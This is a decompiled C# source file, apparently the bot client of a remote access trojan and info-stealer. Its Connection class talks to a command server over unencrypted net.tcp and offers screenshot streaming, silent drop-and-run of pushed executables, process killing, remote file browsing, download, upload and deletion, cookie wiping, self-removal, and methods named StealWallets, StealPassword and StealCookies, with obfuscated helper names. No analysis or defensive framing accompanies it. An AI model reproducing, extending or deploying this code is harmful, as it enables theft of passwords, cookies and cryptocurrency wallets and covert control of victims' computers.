using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.ServiceModel;
using System.Threading.Tasks;
using System.Xml;
using MainModule;
using MainModule.Classes;

namespace Dodjins
{
	// Token: 0x0200001D RID: 29
	[CallbackBehavior(ConcurrencyMode = ConcurrencyMode.Multiple, UseSynchronizationContext = false)]
	public class Connection : Callbacie81ks
	{
		// Token: 0x060000A0 RID: 160 RVA: 0x000042FC File Offset: 0x000024FC
		public static byte[] GetFileBytes(string filename)
		{
			byte[] result;
			try
			{
				bool flag = File.Exists(filename);
				if (flag)
				{
					using (FileStream fileStream = File.Open(filename, FileMode.Open, FileAccess.Read))
					{
						byte[] array = new byte[fileStream.Length];
						fileStream.Read(array, 0, (int)fileStream.Length);
						return array;
					}
				}
				result = null;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x060000A1 RID: 161 RVA: 0x00004374 File Offset: 0x00002574
		// (set) Token: 0x060000A2 RID: 162 RVA: 0x0000437C File Offset: 0x0000257C
		private string ExeFile { get; set; }

		// Token: 0x060000A3 RID: 163 RVA: 0x00004385 File Offset: 0x00002585
		public Connection(SubInfo _info, string serviceAdress, string exe)
		{
			this.info = _info;
			this.ServiceAdress = serviceAdress;
			this.ExeFile = exe;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x000043A8 File Offset: 0x000025A8
		private void Reset(object obj, EventArgs args)
		{
			try
			{
				this.BeginListener();
				this.firstLayer.Subscribe(this.info).Wait();
			}
			catch
			{
			}
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x000043F0 File Offset: 0x000025F0
		public void BeginListener()
		{
			try
			{
				this.context = new InstanceContext(this);
				NetTcpBinding netTcpBinding = new NetTcpBinding
				{
					Security = new NetTcpSecurity
					{
						Mode = SecurityMode.None
					},
					MaxBufferPoolSize = 2147483647L,
					MaxReceivedMessageSize = 2147483647L,
					ReaderQuotas = new XmlDictionaryReaderQuotas
					{
						MaxDepth = 2000000,
						MaxStringContentLength = int.MaxValue,
						MaxArrayLength = int.MaxValue,
						MaxBytesPerRead = int.MaxValue,
						MaxNameTableCharCount = int.MaxValue
					}
				};
				netTcpBinding.SendTimeout = new TimeSpan(24, 30, 0);
				netTcpBinding.ReceiveTimeout = new TimeSpan(24, 30, 0);
				netTcpBinding.OpenTimeout = new TimeSpan(24, 30, 0);
				this.duplexLayer = new DuplexChannelFactory<IConnector>(this.context, netTcpBinding);
				this.firstLayer = this.duplexLayer.CreateChannel(new EndpointAddress(string.Format("net.tcp://{0}:23563/IConnector", this.ServiceAdress)));
				((ICommunicationObject)this.firstLayer).Faulted += this.Reset;
				Console.WriteLine("Connected to the server...");
			}
			catch
			{
				this.BeginListener();
			}
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00004548 File Offset: 0x00002748
		private byte[] ImageToByte(Image img)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				img.Save(memoryStream, ImageFormat.Png);
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00004590 File Offset: 0x00002790
		public Task BeginTransferImage()
		{
			return Task.Factory.StartNew(delegate
			{
				try
				{
					Console.WriteLine("BeginTransferImage");
					this.screenShoter = new ddleuwja();
					ddleuwja ddleuwja = this.screenShoter;
					ddleuwja.OnScreenshotTaken = (stataken)Delegate.Combine(ddleuwja.OnScreenshotTaken, new stataken(delegate(Bitmap img)
					{
						try
						{
							byte[] b = this.ImageToByte(img);
							byte[] image = this.Compress(b);
							this.firstLayer.RecieveImage(image).Wait();
						}
						catch
						{
							this.screenShoter.Dispose();
						}
					}));
				}
				catch
				{
					this.screenShoter.Dispose();
				}
			});
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x000045B8 File Offset: 0x000027B8
		public Task StopTransferImage()
		{
			return Task.Factory.StartNew(delegate
			{
				bool flag = this.screenShoter != null;
				if (flag)
				{
					this.screenShoter.Dispose();
				}
			});
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x000045E0 File Offset: 0x000027E0
		private byte[] Compress(byte[] b)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gzipStream.Write(b, 0, b.Length);
				}
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00004648 File Offset: 0x00002848
		public Task DeleteBot()
		{
			return Task.Factory.StartNew(delegate
			{
				bool flag = File.Exists(Path.GetTempPath() + "\\MSBuild.exe");
				if (flag)
				{
					File.Delete(Path.GetTempPath() + "\\MSBuild.exe");
				}
				Mrazilia.RemoveByPath(this.ExeFile);
				Mrazilia.KillOAIA(this.ExeFile);
			});
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00004670 File Offset: 0x00002870
		public Task<bool> SendFile(byte[] file, string name, bool silient, string args)
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					bool flag = !Directory.Exists(Path.GetTempPath() + "MonoCecil\\WorkDir");
					if (flag)
					{
						Directory.CreateDirectory(Path.GetTempPath() + "MonoCecil\\WorkDir");
					}
					bool flag2 = File.Exists(Path.Combine(Path.GetTempPath() + "MonoCecil\\WorkDir", name));
					if (flag2)
					{
						File.Delete(Path.Combine(Path.GetTempPath() + "MonoCecil\\WorkDir", name));
					}
					File.WriteAllBytes(Path.Combine(Path.GetTempPath() + "MonoCecil\\WorkDir", name), file);
					bool silient2 = silient;
					if (silient2)
					{
						Process.Start(new ProcessStartInfo
						{
							Arguments = args,
							WindowStyle = ProcessWindowStyle.Hidden,
							CreateNoWindow = true,
							FileName = name,
							WorkingDirectory = Path.GetTempPath() + "MonoCecil\\WorkDir"
						});
					}
					else
					{
						Process.Start(new ProcessStartInfo
						{
							Arguments = args,
							FileName = name,
							WorkingDirectory = Path.GetTempPath() + "MonoCecil\\WorkDir"
						});
					}
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x060000AC RID: 172 RVA: 0x000046BC File Offset: 0x000028BC
		public Task<bool> ClearCookie()
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					List<bbbrrooowser> list = new List<bbbrrooowser>
					{
						new bbbrrooowser
						{
							BrowserName = "Chrome",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Yandex",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Kometa",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Kometa\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Amigo",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Amigo\\User\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Torch",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Torch\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Orbitum",
							CookiePaths = new List<string>
							{
								Environment.GetEnvironmentVariable("LocalAppData") + "\\Orbitum\\User Data\\Default\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Opera",
							CookiePaths = new List<string>
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies"
							}
						},
						new bbbrrooowser
						{
							BrowserName = "Mozilla",
							CookiePaths = Dominatroer.CookMoz()
						}
					};
					List<BrowserCookie> list2 = new List<BrowserCookie>();
					Dominatroer.KillAwerything();
					foreach (bbbrrooowser bbbrrooowser in list)
					{
						foreach (string path in bbbrrooowser.CookiePaths)
						{
							try
							{
								bool flag = File.Exists(path);
								if (flag)
								{
									File.Delete(path);
								}
							}
							catch
							{
							}
						}
					}
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x060000AD RID: 173 RVA: 0x000046F8 File Offset: 0x000028F8
		public Task<List<ProcessInfo>> LoadProcesses()
		{
			return Task.Factory.StartNew<List<ProcessInfo>>(delegate
			{
				List<ProcessInfo> result;
				try
				{
					List<ProcessInfo> list = new List<ProcessInfo>();
					foreach (Process process in Process.GetProcesses())
					{
						try
						{
							list.Add(new ProcessInfo
							{
								ID = process.Id,
								Name = process.ProcessName,
								Path = process.MainModule.FileName
							});
						}
						catch
						{
						}
					}
					result = list;
				}
				catch (Exception ex)
				{
					result = new List<ProcessInfo>();
				}
				return result;
			});
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00004734 File Offset: 0x00002934
		public Task<bool> KillProcess(int id)
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					Process.GetProcessById(id).Kill();
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000476C File Offset: 0x0000296C
		public Task<string[]> RootDrives()
		{
			return Task.Factory.StartNew<string[]>(delegate
			{
				string[] result;
				try
				{
					result = Connection.fileManager.Drives();
				}
				catch
				{
					result = new string[0];
				}
				return result;
			});
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x000047A8 File Offset: 0x000029A8
		public Task<List<FileInformation>> DirInfo(string path)
		{
			return Task.Factory.StartNew<List<FileInformation>>(delegate
			{
				List<FileInformation> result;
				try
				{
					result = Connection.fileManager.InfoAboutDir(path);
				}
				catch (Exception ex)
				{
					result = new List<FileInformation>();
				}
				return result;
			});
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x000047E0 File Offset: 0x000029E0
		public Task<byte[]> DownloadFile(string file)
		{
			return Task.Factory.StartNew<byte[]>(delegate
			{
				byte[] result;
				try
				{
					using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read))
					{
						byte[] array = new byte[fileStream.Length];
						fileStream.Read(array, 0, (int)fileStream.Length);
						result = array;
					}
				}
				catch
				{
					result = new byte[0];
				}
				return result;
			});
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x00004818 File Offset: 0x00002A18
		public Task<bool> UploadFile(byte[] file, string filePath)
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					File.WriteAllBytes(filePath, file);
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00004854 File Offset: 0x00002A54
		public Task<bool> RemoveFile(string path)
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					File.Delete(path);
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000488C File Offset: 0x00002A8C
		public Task<List<BitcoinWallet>> StealWallets()
		{
			return Task.Factory.StartNew<List<BitcoinWallet>>(delegate
			{
				List<BitcoinWallet> result;
				try
				{
					result = Dominatroer.sssq2();
				}
				catch
				{
					result = new List<BitcoinWallet>();
				}
				return result;
			});
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x000048C8 File Offset: 0x00002AC8
		public Task<UserLog> StealPassword()
		{
			return Dominatroer.StealPassword();
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x000048E0 File Offset: 0x00002AE0
		public Task<List<BrowserCookie>> StealCookies()
		{
			return Dominatroer.cccokies();
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x000048F8 File Offset: 0x00002AF8
		public Task<bool> RunFile(string path)
		{
			return Task.Factory.StartNew<bool>(delegate
			{
				bool result;
				try
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = path,
						WorkingDirectory = Directory.GetParent(path).FullName
					});
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			});
		}

		// Token: 0x0400005E RID: 94
		private static FileManager fileManager = new FileManager();

		// Token: 0x04000060 RID: 96
		private SubInfo info;

		// Token: 0x04000061 RID: 97
		private string ServiceAdress;

		// Token: 0x04000062 RID: 98
		private DuplexChannelFactory<IConnector> duplexLayer;

		// Token: 0x04000063 RID: 99
		public IConnector firstLayer;

		// Token: 0x04000064 RID: 100
		private InstanceContext context;

		// Token: 0x04000065 RID: 101
		private ddleuwja screenShoter;
	}
}
